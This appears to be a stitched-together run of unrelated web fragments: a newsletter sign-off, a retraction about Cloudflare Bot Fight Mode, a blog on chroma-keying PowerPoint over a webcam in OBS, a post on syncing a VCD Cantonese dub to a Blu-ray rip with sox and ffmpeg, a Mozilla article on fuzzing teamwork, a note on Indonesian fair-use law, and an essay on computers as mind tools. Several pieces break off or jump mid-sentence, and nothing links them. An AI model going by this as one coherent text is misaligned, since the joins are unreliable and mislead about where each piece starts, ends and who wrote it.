journals.&nbsp;</p><p>— <a href="https://twitter.com/nikillinit">Nikhil Krishnan, Founder at Out-Of-Pocket, 2x World Record Holder for most thoughts thunk</a></p><p>Thinkboi out,</p><p>Nikhil aka. “more of an ideas guy”</p><p>Twitter:&nbsp;<a href="https://twitter.com/nikillinit">@nikillinit</a></p><p>IG:&nbsp;<a href="https://www.instagram.com/outofpockethealth/">@outofpockethealth</a></p><p><em>If you’re enjoying the newsletter, do me a solid and shoot this over to a friend or healthcare slack channel and tell them&nbsp;<a href="http://outofpocket.substack.com/">to sign up.</a>&nbsp;The line between unemployment and founder of a startup is traction and whether your parents believe you have a job.</em></p><p data-attrs="{&quot;url&quot;:&quot;https://outofpocket.health/p/six-healthcare-startup-ideas?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://outofpocket.health/p/six-healthcare-startup-ideas?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p></div></div>]]>

The claims contained in this article were incorrect. After another contact with Cloudflare support, it turned out that the Bot Fight Mode behaves differently for Free and PRO plans. That's what caused the instant improvement after upgrading. Another way to resolve the issues I was experiencing would have been to disable the bot fight mode altogether or add a custom page rule disabling it. My website never experienced any traffic throttling. I've decided to remove the article, to stop spreading the misinformation about CF services.

<p>I don't know if you've ever seen me present. I like to use whiteboards or flip charts, and that doesn't necessarily translate well to online presentations.</p>



<p>It was at least ten years ago when I had an idea about giving online presentations with a whiteboard, but where the whiteboard would be between me and the camera. A glassboard rather than a whiteboard, obviously, so that I would still be visible through the glass but not obscuring the text. And the image would be mirrored so that the things I wrote would be readable to the audience, given that I'd be drawing on the other side of it. Recently I've found out this is a real thing called <a rel="noreferrer noopener" aria-label="Lightboard (opens in a new tab)" href="https://library.iated.org/view/KOC2017LIG" target="_blank">Lightboard</a>, using ultra-clear glass and lights to make sure what's drawn glows enough. And considering this seems to have only appeared around 2015 (a good five years after I was musing about the concept), I really should've explored things further. </p>



<figure><img src="https://wiki.nus.edu.sg/download/attachments/135954958/lightboard.jpg?version=1&amp;modificationDate=1458616080983&amp;api=v2" alt=""><figcaption>This picture is from a site belonging to the <a rel="noreferrer noopener" aria-label="National University of Singapore (opens in a new tab)" href="https://wiki.nus.edu.sg/pages/viewpage.action?pageId=135954958" target="_blank">National University of Singapore</a>, but an image search gives plenty of examples</figcaption></figure>



<p>In a world where technical presentations are more online than in-person, I've struggled a bit with how to give my usual style of presentation. I know I could set up something like this, and I've been tempted, but it would be a lot of effort, and it's not exactly portable, and I just haven't (although I know at least one person who has…)</p>



<p>I know what you're thinking – and that's that tools like Teams do have whiteboards in their meetings. That's not what I want though – in those situations the main screen becomes white (or whatever colour the whiteboard background is), and the bit showing me disappears or shrinks to the corner. It's like sharing a screen. And my style isn't just writing on a whiteboard, it's pointing at the whiteboard, it's gesturing, it's all of that stuff that doesn't work if I'm constrained to the corner of the screen. If I had a greenscreen behind me I could do the "weatherperson" trick of moving in front of the screen to point things out, etc, but it's still not quite what I want.</p>



<p>And so I got to thinking about what could be done.</p>



<p>Enter OBS. That free piece of software that many people use now. Plus, from version 26 on, it can act as a Virtual Camera, so that Teams (or Zoom or GoTo or whatever) can show whatever OBS is doing. So if I figured if I could get this to behave the right way, I would be able to use it in live presentations. The button that appeared in version 26 is in the Controls pane in the bottom right of the OBS window. </p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png 306w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12-300x162.png 300w" sizes="(max-width: 306px) 100vw, 306px"></figure>



<p>There is no mode where I can just use my stylus to draw on the screen where my face is. At least I don't believe there is, but I found a workaround.</p>



<p>The basic concept here is that I use my webcam as a source, but overlay a window capture from an application where I can draw with my stylus (PowerPoint will do, and is good for other reasons too). Then I set the application's background to a <a rel="noreferrer noopener" aria-label="chroma key (opens in a new tab)" href="https://en.wikipedia.org/wiki/Chroma_key" target="_blank">chroma key</a> colour (like bright green #00FF00) and filter that out like a traditional greenscreen. I stretch that source in OBS bit so that the main drawing area is over my webcam feed, and all the menus and stuff is outside.</p>



<p>To explain with pictures:</p>



<p>I started with a plain PowerPoint presentation and set the background to bright green. I'm going to leave the PowerPoint application in this mode because I find it behaves better. And as I'm about to draw on it with a stylus, I don't want it to do anything weird by switching into 'presenter mode' or 'annotation mode' or anything like that.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-300x175.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-768x449.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Then in OBS, with the webcam as the bottom layer of the Sources, I add a Window Capture and use the PowerPoint screen.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png 483w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1-300x116.png 300w" sizes="(max-width: 483px) 100vw, 483px"></figure>



<p>Now select the WindowCapture and resize it to match the slide to the webcam. This slide is going to disappear though, when we add the filter.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/ResizingOBS.gif" alt=""></figure>



<p>Right-clicking on the "Window Capture" source, I can go to Filters and add a Chroma Key filter, using the default Green. You'll notice that the bits that are green in PowerPoint have gone grey, indicating that they'll be invisible.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png 863w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-300x263.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-768x675.png 768w" sizes="(max-width: 863px) 100vw, 863px"></figure>



<p>Now back in OBS, I see myself again..</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png 975w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-300x223.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-768x572.png 768w" sizes="(max-width: 975px) 100vw, 975px"></figure>



<p>…but when I write in PowerPoint, it appears in front of me. (Oh, because I want to point at the things I draw, I flip the webcam horizontally. You might have noticed the writing on my shirt is backwards.)</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-768x444.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And it's not just text that works. I can have standard bullet-point text.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-768x446.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And I can write in other colours too, just not green.</p>



<p>But that brings me to an interesting set of tricks.</p>



<p>The first one is to grab a screenshot of me on the webcam, and make it very saturated, and green. I can do this using just about any image editing tool. So now I have an image that looks like this.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png 759w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7-300x169.png 300w" sizes="(max-width: 759px) 100vw, 759px"></figure>



<p>I set this to my PowerPoint background, and I can easily see where I can draw and where I can't (assuming I don't move around too much).</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-300x180.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-768x461.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I can also add gridlines to help my handwriting stay neater, and help me make sure I don't run out of room.</p>



<p>But in many ways the biggest trick is around the flow of my presentation.</p>



<p>Part of why I use whiteboards and flipcharts is because I feel like they help the audience connect with me better. There's something about writing live that means that people feel like I'm doing it on the fly, being more responsive to how the audience is responding, changing tack as I go. </p>



<p>But it's not like that at all. When I present without slides, or even without a computer, I have to know my material really well. I have to know where I'm going. I don't have the crutch of a slide deck of bullet points. I need to know what I'm planning to write. How I'm going to make the various points. Even how the audience is likely to respond to various things. By knowing the narrative of my presentation really well, it gives me the freedom to move around the content if I feel like I need to, but I have to know my anchor points in my head, because I don't have them on the screen.</p>



<p>So… as long as they're still green, and therefore invisible to the audience, I can indeed have them on the screen now. And whether I use consecutive slides with different colours (first green, then white/black/whatever) to make it look like it's building, or whether I trace over the top using my stylus, I can have all the notes I like – even notes to myself that the audience can't see. I can have as many slides as I want and can move around them just like regular folk do.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-768x445.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When it comes to giving demos, I still need to add a separate screen or do traditional screensharing through Teams or GoTo or Zoom or whatever. But with a bit more effort I could do my demo in the background and still draw over the top. Or get a physical greenscreen behind me so that I can have a solid background or demo screen behind me and still have my drawings in the foreground. This can definitely go a lot further.</p>



<p>But for my whiteboard-based presentations, this should work nicely.</p>



<p><a href="http://twitter.com/rob_farley" target="_blank" rel="noreferrer noopener" aria-label="@rob_farley (opens in a new tab)">@rob_farley</a> </p>



<p>PS: I just made a short video at <a rel="noreferrer noopener" aria-label="https://youtu.be/LdtmEf2XhSU (opens in a new tab)" href="https://youtu.be/LdtmEf2XhSU" target="_blank">https://youtu.be/LdtmEf2XhSU</a> to show drawing on the screen. It would've been better if I had taken a few minutes to sort out my lighting and background, but you can see the rough concept there.</p>

                    <p>We have children in the family learning both English and Cantonese simultaneously, a great way to help support this will be to show them films that they will love in their mother tongue, and what better films to show children but films by Studio Ghibli? </p><p>But here's the problem: &nbsp;Studio Ghibli films are in Japanese (naturally), but fortunately they've been translated into many languages and distributed world wide. Even better, they're now even available on Netflix. However, for simplicities sake, you tend to only be able to get the translated version for the country or region that you're living in, so for the UK...

Not DVDs, <strong>VCDs</strong>. These seemed to come and go pretty quickly in the west, being replaced by DVDs. In Asia however, VCDs were popular for far longer (<a href="https://en.wikipedia.org/wiki/Video_CD#In_Asia">https://en.wikipedia.org/wiki/Video_CD#In_Asia</a>). VCDs have two main problems when using them in 2021: Firstly, the quality can only be accurately summarised as "<a href="https://knowyourmeme.com/memes/recorded-with-a-potato">Potato</a>". Secondly, because a CD is limited to 700MB, the film has to be split in half across two disks.

<ol>
<li>Rip the Blu Ray and VCD versions to my computer.</li>
<li>Extract the Cantonese Dub from the VCD version.</li>
<li>Add it as a new language track on the extracted mp4.</li>
<li>Enjoy a classic film in a new language on my HD TV.</li>
</ol>
<p>Alas, the best made plans, often go awry..</p>
<ul>
<li>The VCD films are split int two, meaning they need to be re-joined (Nothing a little ffmpeg magic can't do!).</li>
<li>The Join in the middle is sometimes, but not always exact, meaning that there may be milliseconds missing in the middle when compared to the full length film.</li>
<li>The VCD film and Blu Ray films are not entirely identical, the VCDs have a black screen with the name of the local distributor at the start for a few seconds (of varying length).</li>
</ul>
<!--kg-card-end: markdown--><h2 id="new-plan-choirless-to-the-rescue-">New Plan - Choirless to the Rescue!</h2><p>Re-winding back to 2020, some colleagues of mine in IBM had a fantastic idea for our Internal Call for Code competition. <a href="https://www.choirless.com/">Choirless</a> is an online web service that allows distanced choir and band members to record their performances separately and to have them automatically synchronised and merged into a fantastic performance video. The summary of Choirless is well worth a watch:</p><figure></figure><p>It struck me that the work Choirless does to synchronise all of the performers could potentially be the magic bullet for solving this, <a href="https://twitter.com/HammerToe">@HammerToe</a> had written some clever python that could take two audio streams and synchronise them and even had streamed a walkthrough of his code that I had managed to catch months ago by chance:</p><figure></figure><p>Anything that I could explain here about my process would just be a re-hashing of the above video, so I highly recommend that you check it out. But the key point is this: Whilst both the Japanese and Cantonese audio tracks will be different because of the language differences, there is still plenty of audio that should be (almost) <em><strong>identical. </strong></em>All of the music and sound effects should be the same across both versions, so that will give us exactly what we need to identify the correct starting points for the Cantonese dub.</p><h2 id="how-it-works">How it works</h2><figure><img src="https://jsutton.co.uk/content/images/2021/02/diagram.png" alt=""><figcaption>Diagram showing the synchronisation process&nbsp;</figcaption></figure><p>The process starts off with extracting the video &amp; audio from the Blu Ray and VCDs onto your computer, I used <a href="https://handbrake.fr/">handbrake</a> for this.</p><p>Then you process the HQ Video (Primary) and the first VCD Video (Secondary). The python script will use the onset strength to look for peaks in both audio streams, it will then do forward and back passes with different offsets to find the best match for where the onset strength matches up.</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1000w, https://jsutton.co.uk/content/images/size/w1600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1600w, https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png 2354w" sizes="(min-width: 720px) 720px"><figcaption>Two charts showing the onset strength peaks before and after synchronisation.</figcaption></figure><p>Now because the VCD was split in two, we need to work out at which point the audio "should" start, so that we can skip forward on the primary track to the right place to give us our best chance of finding the offset. This is basically the following formula:</p><!--kg-card-begin: markdown--><p><code>hq_offset = part_1_duration - part_1_offset</code></p>
<!--kg-card-end: markdown--><p>Once we've got that, we repeat the synchronisation process for the second half of the audio! Sometimes the difference is positive rather than negative, this means that there is sadly a gap in the middle, so we need to add a slight delay in the middle before carrying on, so keep that in mind when you're doing this yourself.</p><!--kg-card-begin: markdown--><p>At this point, we should have the following:</p>
<ul>
<li>HQ rip of the Blu Ray</li>
<li>LQ Rip Parts 1 and 2 of the VCD</li>
<li>The offset in milliseconds for both parts of the VCD audio.</li>
</ul>
<!--kg-card-end: markdown--><p>Now for the fun part, use <a href="http://sox.sourceforge.net/#:~:text=SoX%20is%20a%20cross%2Dplatform,audio%20files%20on%20most%20platforms.">sox</a> to join the audio streams together, if you need to add some "dead air" in the middle, then use you can also generate some empty audio with sox:</p><!--kg-card-begin: markdown--><p>Generate 510ms of blank audio:<br>
<code>sox -n -r 44100 -c 1 silence510ms.wav trim 0.0 0.510</code></p>
<p>Merge Audio Streams:<br>
<code>sox file1.wav file2.wav merged.wav</code></p>
<p>Add your merged audio into your existing HQ film:<br>
<code>ffmpeg -i high_quality_film.mp4 -i cantonese_merged.aac -map 0 -map 1:a -c copy high_quality_film_Cantonese.mp4</code></p>
<!--kg-card-end: markdown--><p>Tada! You should now see a new audio track on your film in the language of your choice for you to personally enjoy.

<p><span>Psychological effects, emotions and group dynamics play a crucial role in software development, especially when it comes to automated fuzz testing. In this article, Christian points out these phenomena and shows us how to make development and security teams work together.</span></p>

<hr>

<h2>You Will Need Trust and Empathy</h2>
<p>During my nearly ten years at Mozilla, I often found myself somewhere between the security testing team and the development teams. Throughout this time, I was able to learn many valuable lessons. One of the biggest challenges I have faced, was establishing trust between those two parties.&nbsp;</p>
<p>By nature, the relationship between development and security teams is often prone to bad blood. But with empathy and appreciation, you can bring them together to work as a unit. In this article, I want to share my experiences to help you improve this relationship.</p>

<h2>Large-Scale Software Development Is More Challenging Than It Seems</h2>
<p>Developing a piece of software as complex as a web browser is far more complicated than many people think. Internet browsers such as Firefox consist of over<a href="https://hacks.mozilla.org/2020/04/code-quality-tools-at-mozilla/"><span> 21 million lines of code</span></a>. Firefox has several hundreds of authors and around 2000 commits per month. The browser can be divided into several components that provide various features, e.g. rendering of HTML, CSS or SVG, but also multiple media support and a highly optimized JavaScript engine, just to name a few.</p>

<h2>Complexity Requires Specialization</h2>
<p>For each of these components, there is at least one specialized team. Their <em>domain knowledge</em> allows them to better understand the code architecture and they are more familiar with the contracts between the different modules. As a result, each team knows their code’s expected behavior and potential weaknesses best.</p>
<p>Nonetheless, each of the individual browser components requires a thorough security testing strategy. Fuzzing is a highly effective way to achieve this. However, to perform well, fuzzing requires each team’s domain knowledge. This is just one reason why the traditional "lone-warrior fuzzing" approach is no longer sufficient in this scenario. What we need instead is a mutual trust relationship.</p>

<h2>No More Fuzzing Ninja-Style&nbsp;</h2>
<p>There is a need for a positive working relationship between the development and the security testing team. This observation does not only apply to our case at Mozilla - It is a problem that concerns managers and tech-leads in many industries.</p>
<p>So, please avoid fuzzing ninja-style. Don’t build a fuzzer on your own and in secret just to rapid-fire bugs at your development team. This approach is outdated. It might help you feel superior for a while, but not only will it deteriorate the relationship between you and your fellow developers, it is also the least effective way to build a fuzzer. If you can get your developers’ help, <strong>together </strong>you will achieve much more.</p>

<h2>Don’t Assume Equal Priorities</h2>
<p>Development teams often suffer from a lack of resources. Dumping a massive load of bugs on their desk can lead to defensive behavior. Developers will feel overwhelmed and perceive these bugs as “extra work” caused by you and your security team. Merely digging up errors in a project that someone else put diligence and effort into can create a lot of tension.</p>
<p><img src="https://lh3.googleusercontent.com/9-c1Xctutp2bUdVrc-GXDXl9UFG0lH6jh19cfPDU96u359wTDJZcOr9GmveOs16L6Jqw-QXD9-L_qZNwjdNsVR9WHoGbnMD1MxeMLQcaQLlv_9algqwfsWDcxHxJIgBNBiQc2Apq" width="406" alt="Dont dump bugs at dev desk"></p>

<p>Don’t show off your findings. Instead, try to understand the developer perspective. They might have a different set of priorities than you. It is crucial for a healthy relationship between security teams and development, that both teams are involved in the testing process. This will also help the development team comprehend your findings better.</p>

<div>
<h3>Code Ownership Bias</h3>
<p>Code Ownership Bias, Initially known as “property oriented programming” (Weinberg, The psychology of computer programming), describes a phenomenon, where developers form an emotional attachment to their code. When other people start testing the code for bugs, developers might interpret it as a threat. Code Ownership Bias can often cause developers to exhibit defensive behaviour when security measures are introduced.</p>
</div>
<h2><br>Talk to Each Other</h2>
<p>To avoid defensive behavior, share previous success stories with the developers. These examples will help them understand your motivation and priorities. Also, make sure to offer your helping hand and show genuine interest in their projects. A relationship is always based on reciprocity. If you communicate more, you might find some valuable hints on where to search for vulnerabilities and errors. This might save your security team a lot of time. It will also help developers understand that your work will help them overall.</p>
<p>Another aspect here is expectations: It is not uncommon for development teams to expect things from fuzzing that fuzzing cannot deliver and the other way around. To avoid conflicts later on, make sure you define goals together and educate each other on requirements early on.</p>

<p><img src="https://lh4.googleusercontent.com/vUVjvrSZ7xl66RYCYAXI6TIFRZxAnfG4e1-Im9IGaNJiwiPo0usrCALUj659vcYGATVbA_LUB1qD1x0CeElbPbmLhoilwiQAUNCCAlsiP7Uz2wax10ugGzL0jf00AnvoS4VAg80C" width="624" height="351" alt="Requirements and Goals"></p>

<h2>Fuzz Blockers: First Impressions Matter</h2>
<p>A fuzz blocker is a bug that is disruptive to your fuzzing operations. Usually, it is a highly frequent bug that consumes many fuzzing resources. At the same time, it is hard to avoid or work around. Therefore, such bugs are of the highest priority for the security team. However, developers usually see fuzz blockers as low-priority bugs. And they are right, since they generally have little to no impact on the usability of an application. Here we have a prime example for very different priorities. It becomes even more critical if you consider that fuzz blockers often occur at the beginning of a testing process. Especially if there is no trust relationship established yet, dealing with this situation properly is vital: If the fuzzing team’s first response after deploying fuzzing is just fuzz blockers, some developers might think that fuzzing will only find “unimportant” bugs. This can ruin the first impression. Educate your developers about this phenomenon!</p>

<h2>Write the First Fix Yourself!</h2>
<p>Instead of feeding fuzz blockers back to the developers right away, I recommend writing the first fix yourself. This way, you will learn something about the project at hand. Being familiar with the codebase is especially useful if you are planning to implement continuous fuzzing on it. You will also learn more about the code’s development and debugging requirements. This might help you improve the bug-fixing process for fuzz bugs in the future.</p>
<p>Additionally, If you manage to fix all the fuzz blockers locally, you can continue fuzzing faster. If you share your patch with the developers, ask them to look over it. They will surely appreciate your effort, even if the patch is not perfect.</p>

<h2>Start Fuzzing as Early as Possible</h2>
<p>Implementing fuzzing in a late stage of the development lifecycle can have a devastating psychological effect. Developers often spend months or even years on a release. Starting with fuzz testing right before production is the worst way to do it. Coming out of the blue and shooting 20 bugs back at the developers after such a long development time can be very discouraging.</p>
<p><img src="https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=482&amp;name=Download%20(2)-1.png" alt="Start fuzzing early" width="482" srcset="https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=241&amp;name=Download%20(2)-1.png 241w, https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=482&amp;name=Download%20(2)-1.png 482w, https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=723&amp;name=Download%20(2)-1.png 723w, https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=964&amp;name=Download%20(2)-1.png 964w, https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=1205&amp;name=Download%20(2)-1.png 1205w, https://blog.code-intelligence.com/hs-fs/hubfs/Download%20(2)-1.png?width=1446&amp;name=Download%20(2)-1.png 1446w" sizes="(max-width: 482px) 100vw, 482px"></p>

<p>To avoid this, you should start fuzz testing as soon as the project is ready for it. But when is a project ready? Again, it is imperative for you to communicate with developers on this. Sometimes, very early versions of a project have too many known issues, and fuzzing would not contribute much. In general, fuzzing should start at the earliest version that developers consider stable enough for testing. This will ensure you catch bugs early on and give your team some time to resolve issues around fuzzing, while driving up its effectiveness.</p>

<h2>Watch Out for Experimental Features</h2>
<p>Sometimes it can even be helpful to fuzz experimental features. But again, you should consult with the developers first. Developers usually implement experimental features behind switches for a reason. At this stage, they are probably already aware of some bugs and vulnerabilities. Pointing them out by turning on switches without further consultation is usually not too well received.</p>

<h2>Become a Teacher</h2>
<p>Try to make the security testing process transparent to the developers. Provide them with insights on how fuzzing actually works and regularly share updates on progress, e.g. through code coverage. Make the use of required tools (e.g. to reproduce your bugs) as easy as possible for developers. Also, make sure they understand your intentions and ask them if they have everything they need to comprehend what you are doing. In the end, educating them will help you implement early-stage security testing practices</p>

<p><em>“At the end of the day, fuzzing is teamwork.” </em></p>
<p>– Christian Holler</p>
<h2>Fuzzing Is Teamwork!</h2>
<p>This last point sums up the essence of this entire article. Security teams should involve developers in their testing processes from start to finish. As a company, you can achieve so much more if your teams work together instead of against each other. At the end of the day, fuzzing is teamwork.</p>

February 8, 2021 | http://www.youripinsider.eu/fair-use-copyright-law-indonesia/ | <a href="https://web.archive.org/web/*/http://www.youripinsider.eu/fair-use-copyright-law-indonesia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><em><a href="http://www.youripinsider.eu/wp-content/uploads/2014/10/shutterstock_107811341.jpg"><img src="http://www.youripinsider.eu/wp-content/uploads/2014/10/shutterstock_107811341-300x225.jpg" alt="shutterstock_107811341" width="243" height="186"></a>A guest post from <strong>Andrew Conduit</strong>, solicitor at <strong>SKC</strong>, discusses Indonesia’s new&nbsp;Copyright Law</em><em>. A development that follows international standards </em>and moves legislation closer to the reality of how copyrighted material is actually used.</p>

<p>With Indonesia’s new Copyright Law set <a href="http://skclaw.blogspot.com/2014/09/new-copyright-law.html">to come into force later this month</a>, it is an opportune time to consider how the new provisions will affect ‘fair use’ in Indonesia. <strong>&nbsp;‘Fair use’ refers to exceptions to copyright protection, designed to facilitate the use of copyrighted material that may be considered acceptable but otherwise technically infringing copyright laws. </strong>&nbsp;For example, purchasing a downloaded song on an iPad and copying it to an iPhone where both devices belong to the same owner.</p>
<p>The new Indonesian Copyright Law incorporates four significant fair use exceptions:</p>
<ol>
<li>article 44d: the reproduction and distribution of copyrighted content through IT and communications media where such use is non-commercial in nature;</li>
<li>article 46(a): making one copy of a computer program for backup or research and development purposes;</li>
<li>article 47: making one copy of any type of work for personal use; and</li>
<li>article 50: temporary copies of works made by digital media.</li>
</ol>
<p>These broad exceptions for non-commercial and personal use are evidence of a more progressive approach to copyright protection in Indonesia. &nbsp;<strong>Whereas there was a massive disconnect between the provisions of the current Copyright Law and how Indonesians actually deal with copyrighted material, the new law closes this gap.</strong> &nbsp;This makes the law a more relevant legal instrument, and one that is more likely to be respected and observed.</p>
<p>Fair use exceptions are also included in the copyright laws of other countries. &nbsp;For example, the equivalent provision in US Copyright Law (17 U.S.C. § 107):</p>
<p><em>… the fair use of a copyrighted work, including such use by reproduction in copies or phonorecords or by any other means specified by that section, for purposes such as criticism, comment, news reporting, teaching (including multiple copies for classroom use), scholarship, or research, is not an infringement of copyright. In determining whether the use made of a work in any particular case is a fair use the factors to be considered shall include:&nbsp;</em></p>
<ul>
<li><em>the purpose and character of the use, including whether such use is of a commercial nature or is for nonprofit educational purposes;</em></li>
<li><em>the nature of the copyrighted work;</em></li>
<li><em>the amount and substantiality of the portion used in relation to the copyrighted work as a whole; and</em></li>
<li><em>the effect of the use upon the potential market for or value of the copyrighted work.&nbsp;</em></li>
</ul>
<p><em>The fact that a work is unpublished shall not itself bar a finding of fair use if such finding is made upon consideration of all the above factors.</em></p>
<p>The new Indonesian Copyright Law also includes the familiar exceptions for education, news reporting, and government institutions provided the author of the work is properly disclosed.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://www.murilopereira.com/man_on_a_bicycle.jpg"></figure><blockquote><p>I think one of the things that really separates us from the high primates
is that we’re tool builders. I read a study that measured the efficiency of
locomotion for various species on the planet. The condor used the least
energy to move a kilometer. Humans came in with a rather unimpressive
showing about a third of the way down the list. It was not too proud a
showing for the crown of creation. So, that didn’t look so good.</p><p>But then, somebody at Scientific American had the insight to test the
efficiency of locomotion for a man on a bicycle. And, a man on a bicycle, a
human on a bicycle, blew the condor away, completely off the top of the
charts.</p><p>And that’s what a computer is to me. What a computer is to me is it’s the
most remarkable tool that we’ve ever come up with.</p><p>It’s the equivalent of a bicycle for our minds.</p><p>— <a href="https://www.youtube.com/watch?v=0lvMgMrNDlg&amp;feature=youtu.be&amp;t=322">Steve Jobs (1980)</a></p></blockquote><p>* * *</p><p><a href="https://www.it-hiroshima.ac.jp/institution/library/pdf/research52%5F007-013.pdf">No one knows</a> when or how we, the human species, started talking to each
other. It is likely a natural progression from gesturing, but we can only
speculate about it.</p><p>Language allowed us to break out of our brains and reveal the inner
workings of our consciousness to others.</p><figure><img src="https://www.murilopereira.com/language_speech.jpg" alt="Figure 2: Scott H. Young"><figcaption><p>Figure 2: <a href="https://www.scotthyoung.com/blog/2018/12/04/25-thinking-tools/">Scott H. Young</a></p></figcaption></figure><p>Language is the vessel that carried us from the stone age through the
agricultural revolution, the development of written language, the
scientific and industrial revolutions, and now, the digital age.</p><p>Writing allowed us to <em>offload</em> memories to the physical world—outside of
our brains. Through our collective and external memories, each generation
has a head start on the previous one. Little by little, standing on the
shoulders of taller and taller giants, we accumulate knowledge about
ourselves and everything around us.</p><p>We’ve been for long using tools to help us think: notebooks help us
calculate formulas, reason geometrically and preserve our ideas. With
computers, our <em>thinking</em> is now occurring outside of our brains.</p><p>Computers are extensions of our minds in that they allow us to store,
process, and retrieve information from them. With the advent of the
internet we now have immediate access to not only almost all of the
information ever produced by humankind but also to reproducible <em>thinking</em>
encoded into these machines: algorithms.</p><p>Our brain is still a much more impressive device than any of today's
computers. Computers learn
<a href="https://www.davidsilver.uk/wp-content/uploads/2020/03/nfsp-1.pdf">mostly</a>
by finding patterns in massive
quantities of examples given by us. Teaching a young kid about cars—how
to recognize one, what they are, what their purpose is, and how they're
related to other things—requires little supervision. Noam Chomsky talks
about it in
<a href="https://www.youtube.com/watch?v=hdUbIlwHRkY&amp;t=1462">this interview</a>.</p><p>Each of these processes—storing, processing and retrieving
information—have concrete effects on the physical world: if I’m in
Munich, saying “show route to Hamburg” to my phone will immediately show me
the distance, ETAs and paths for different types of transport to reach my
destination. Not only do I now suddenly know how to navigate across the
country to reach another city, I’m also able to follow through the exact
path via GPS—a sixth sense giving me perfect geolocation!</p><p>These <em>things</em> that we created—computers, and the internet—are literally
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6502424/">rewiring our brains</a>, right now, shaping how we think, and engage in social
relationships, changing not only our individual selves but the societies we
live in.</p><p>They started as mechanical machines that filled entire laboratories, turned
into beige boxes in our homes and places of work, and are now sleek slabs
of plastic, metal and glass in everyone’s pockets. Step by step they get
closer to our bodies, their interfaces more intuitive and natural.</p><p>The way we communicate with them is changing: before, we could only
interact with them by speaking their language. We have now taught them
ours. The torch of progress blazes on: it’s a matter of <em>time</em> until they’re
connected directly with our brains—which is equally terrifying and
